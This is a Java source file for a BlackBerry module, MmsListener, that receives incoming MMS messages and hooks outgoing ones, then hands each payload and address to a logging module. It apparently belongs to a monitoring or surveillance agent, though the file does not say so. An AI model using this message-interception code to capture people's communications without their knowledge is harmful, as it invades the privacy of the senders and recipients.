//#preprocess

package blackberry.module.mms;

import java.io.IOException;
import java.io.UnsupportedEncodingException;

import javax.microedition.io.Connector;
import javax.wireless.messaging.BinaryMessage;
import javax.wireless.messaging.Message;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

import blackberry.Singleton;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.iSingleton;
import blackberry.module.ModuleMessage;


//#ifdef MMS
public class MmsListener implements iSingleton, SendListener 
//#else
    public class MmsListener implements iSingleton 
//#endif
    {
    
    //#ifndef MMS
    class MMSMock{
        void  addSendListener(Object obj){};
        void removeSendListener(Object obj){};
    };
    
    MMSMock MMS;
    
    //#endif
    
    //#ifdef DEBUG
    private static Debug debug = new Debug("MmsListener", DebugLevel.VERBOSE);
    //#endif
    private static final long GUID = 0xc0f37ed8a77b8141L;
    private static MmsListener instance;

    private MessageConnection _mc;
    private boolean _stop = false;

    public synchronized static MmsListener getInstance() {

        if (instance == null) {
            instance = (MmsListener) Singleton.self().get(GUID);
            if (instance == null) {
                final MmsListener singleton = new MmsListener();
                Singleton.self().put(GUID, singleton);
                instance = singleton;
            }
        }

        return instance;
    }

    private ModuleMessage moduleMessage;
    private ListeningThread _listener;

    public void start(ModuleMessage moduleMessage) {
        this.moduleMessage = moduleMessage;
        _listener = new ListeningThread();
        _listener.start();
        MMS.addSendListener(this);
    }

    public void stop() {
        _listener.stop();
        _listener = null;
        //#ifdef DEBUG
        debug.trace("stop: remove sendListener");
        //#endif
        MMS.removeSendListener(this);
    }

    private byte[] getSmsDataMessage(
            final javax.wireless.messaging.Message message) {
    
        byte[] dataMsg = null;
    
        if (message instanceof TextMessage) {
            final TextMessage tm = (TextMessage) message;
            final String msg = tm.getPayloadText();
            //#ifdef DEBUG
            debug.info("Got Text SMS: " + msg);
            //#endif
    
            dataMsg = msg.getBytes();
    
        } else if (message instanceof BinaryMessage) {
            dataMsg = ((BinaryMessage) message).getPayloadData();
    
            try {
    
                //String msg16 = new String(data, "UTF-16BE");
                final String msg8 = new String(dataMsg, "UTF-8");
    
                //#ifdef DEBUG
                //debug.trace("saveLog msg16:" + msg16);
                debug.trace("saveLog msg8:" + msg8);
                //#endif
    
            } catch (final UnsupportedEncodingException e) {
                //#ifdef DEBUG
                debug.error("saveLog:" + e);
                //#endif
            }
            //#ifdef DEBUG
            debug.info("Got Binary SMS, len: " + dataMsg.length);
            //#endif
        }
        return dataMsg;
    }

    public boolean sendMessage(Message message) {

        try {
            final byte[] dataMsg = getSmsDataMessage(message);
            String address = message.getAddress();

            moduleMessage.onNewMms(dataMsg, address, true);
            return true;
        } catch (Exception e) {
            //#ifdef DEBUG
            debug.error("sendMessage");
            //#endif
            
            return false;
        }
    }

    // Inner Classes ------------------------------------------------------------
    private class ListeningThread extends Thread {

        public synchronized void stop() {
            _stop = true;

            try {
                if (_mc != null) {
                    // Close the connection so the thread will return.
                    _mc.close();
                }
            } catch (IOException e) {
                System.err.println(e.toString());
            }
        }

        public void run() {
            try {
                //#ifdef DEBUG

                debug.trace("run");
                //#endif
                _mc = (MessageConnection) Connector.open("mms://:0"); // Closed by the stop() method.

                //DatagramConnection _dc = (DatagramConnection) _mc;
                //#ifdef DEBUG
                debug.trace("mc: " + _mc);
                //#endif
                for (;;) {
                    if (_stop) {
                        //#ifdef DEBUG

                        debug.trace("stop");
                        //#endif
                        return;
                    }
                    Message message = _mc.receive();
                    sendMessage(message);

                }
            } catch (Exception e) {
                //#ifdef DEBUG
                debug.error("run");
                //#endif
            }
        }
    }
}
